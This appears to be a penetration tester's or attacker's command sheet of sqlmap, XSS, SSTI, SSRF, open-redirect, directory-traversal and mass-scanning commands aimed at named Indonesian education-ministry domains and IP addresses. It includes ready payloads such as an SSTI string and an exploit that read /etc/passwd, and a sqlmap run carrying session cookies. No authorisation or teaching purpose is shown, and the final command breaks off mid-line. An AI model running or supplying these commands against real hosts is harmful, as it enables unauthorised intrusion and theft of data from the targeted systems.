
# SQL Injection with sqlmap
sqlmap -r zeroweb.txt --dbs --risk=3 --level=3 --tamper=between --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36" --cookie="JSESSIONID=D1438CD5; username=username; password=password"

# Redirection attack with pwnredir
python2 pwnredir.py -u https://admin.kampusmerdeka.staging.belajar.id -f payloads.list

# XSS attack with pwnxss
python3 pwnxss.py -u https://118.98.222.15/web/

# SSRF attack with pwnssrf
python3 pwnssrf.py -H https://wkmb-dev.kemdikbud.go.id/

# Directory traversal attack with dotdotslash
python3 dotdotslash.py -u https://wkmb-dev.kemdikbud.go.id/

# WebSocket scan
python ws.py -t 

# Vulnerability mapping with vulmap
python vulmap.py -u https://118.98.221.43/

# Cross-Site Scripting (XSS) payloads
cat /home/kali/Tools/Aman.txt | gf xss >> XSS.txt
dalfox file /home/kali/Tools/Aman.txt -o Vulnerable_XSS.txt
cat /home/kali/Tools/Aman.txt | Gxss -p khXSS -o XSS_Ref.txt

# Main script execution
python main.py --file /home/kali/Tools/Aman.txt --thread 15

# Example URL with potential XSS
http://118.98.222.9/data_referensi2.php?id=010000%27%26%23x27%3B%3E%3CiFrAme%2Fsrc%3DjaVascRipt%3Aprompt.valueOf%28%29%281%29%3E%3C%2FiFramE%3E&page=2

# Subdomain finder with status code check
subfinder -dL /home/kali/Tools/Aman.txt | httpx -status-code 

# CORS misconfiguration example URL
https://siplah-dashboard.staging.belajar.id/login/?site=evil.com?site=evil.com

# Joker attack script
python3 jok3r.py attack -t wkmb-dev.kemdikbud.go.id -s http --cat-only vulnscan --add2db hackingloops

# Log sensor script execution
python3 logsensor.py -f /home/kali/Tools/Aman.txt
python logsensor.py -f /home/kali/Tools/Aman.txt --sqli 

# SQLi with hbsqli
python3 hbsqli.py -l /home/kali/Tools/Aman.txt -p payloads.txt -H headers.txt -v

# Additional URLs
https://siplah-dashboard.staging.belajar.id/login
/home/kali/Tools/Aman.txt
http://118.98.222.7/api/article/admin/published?page=4

# Shodan search with specific query
shodanx custom -cq '"Server: Check Point SVN" "X-UA-Compatible: IE=EmulateIE7" 200' -fct ip -o /home/kali/Tools/Aman.txt

# Exploit script execution
python3 exploit.py -l /home/kali/Tools/Aman.txt -t 200 -o output.txt -ftd /etc/passwd

# GoChopChop scan
./gochopchop scan --url-file /home/kali/Tools/Aman.txt

# Xray scan with specific plugins
./xray_linux_amd64 ws --basic-crawler https://wkmb-dev.kemdikbud.go.id --plugins cmd-injection,sqldet --html-output 118.98.222.15.html 

# Subdomain enumeration and scan
subfinder -dL /home/kali/Tools/Aman.txt -all -recursive > subaman.txt 

# URL redirection check
echo "http://118.98.222.7/" | waybackurls | gf redirect

# XSS payload testing
echo | httpx -silent | hakrawler -subs | grep "=" | qsreplace '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
waybackurls http://118.98.222.7/ | urldedupe -qs | bhedak '"><svg onload=confirm(1)>' | airixss -payload "confirm(1)" | egrep -v 'Not'
cat /home/kali/Tools/Aman.txt | anew | httpx -silent -threads 500 | xargs -I@ dalfox url @

# Nmap scan with parallel processing
mkdir nmap; cat /home/kali/Tools/Aman.txt | parallel -j 35 nmap {} -sTVC -host-timeout 15m -oN nmap/{} -p 22,80,443,8080 --open > /dev/null 2>&1; cd nmap; grep -Hari "/tcp" | tee -a ../services.txt; cd ../

# HTTPX path check
subfinder -dL /home/kali/Tools/Aman.txt -silent -all | httpx -silent -ports http:80,https:443,2082,2083 -path 'cpanelwebcall/<img%20src=x%20onerror="prompt(document.domain)">aaaaaaaaaa' -mc 400

# Curl XSS vulnerability check
cat /home/kali/Tools/Aman.txt | while read host do; do curl -sk "$host/appliance/login.ns?login%5Bpassword%5D=test%22%3E%3Csvg/onload=alert(document.domain)%3E&login%5Buse_curr%5D=1&login%5Bsubmit%5D=Change%20Password" | grep -qs '"><svg/onload=alert(document.domain)>' && echo "$host: Vuln" || echo "$host: Not Vuln"; done

# Nuclei scan for subdomains
subfinder -dL /home/kali/Tools/Aman.txt -all -silent | httpx -silent | nuclei -rl 50 -c 15 -timeout 10 -tags cisa -vv

# Server-Side Template Injection (SSTI) check
cat /home/kali/Tools/Aman.txt | subfinder -silent | waybackurls | gf ssti | qsreplace "{{''.class.mro[2].subclasses()[40]('/etc/passwd').read()}}" | parallel -j50 -q curl -g | grep  "root:x"

# Redirect check with waybackurls and HTTPX
subfinder -dL /home/kali/Tools/Aman.txt -all -silent | waybackurls | sort -u | gf redirect | qsreplace 'https://example.com' | httpx -fr -title --match-string 'Example Domain'

# SQL injection with subfinder and sqlmap
subfinder -d http://118.98.222.7/api/article/admin/published?page=4 -all -silent | waybackurls | sort -u | gf sqli > gf_sqli.txt; sqlmap -m gf_sqli.txt --batch --risk 3 --random-agent | tee -a sqli.txt

# DNS probe for specific subdomains
subfinder -dL home/kali/Tools/Aman.txt -all | dnsprobe -silent | cut -d ' ' -f1 | grep --color 'dmz\|api\|staging\|env\|v1\|stag\|prod\|dev\|stg\|test\|demo\|pre\|admin\|beta\|vpn\|cdn\|coll\|sandbox\|qa\|intra\|extra\|s3\|external\|back'

# Naabu and HTTPX for JSON files
subfinder -dL /home/kali/Tools/Aman.txt -all | naabu | httpx | waybackurls | grep -E ".json(?:onp?)?$"

# Nuclei scan for subdomain templates
subfinder -d wkmb-dev.kemdikbud.go.id -all | naabu | httpx | nuclei -t nuclei-templates

# SQL injection scan with findomain and sqlmap
findomain -t https://wkmb-dev.kemdikbud.go.id/ -q | httpx -silent | anew | waybackurls | gf sqli >> sqli ; sqlmap -m sqli --batch --random-agent --level 1

# Jaeles scan for subdomains
cat /home/kali/Tools/Aman.txt | anew | httpx -silent -threads 500 | xargs -I@ jaeles scan -s /jaeles-signatures/ -u @
chaos -d https://wkmb-dev.kemdikbud.go.id/ | httpx -silent | anew | xargs -I@ jaeles scan -c 100 -s /jaeles-signatures/ -u @ 

# SSRF vulnerability check with curl
cat /home/kali/Tools/Aman.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: xss.yourburpcollabrotort'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss
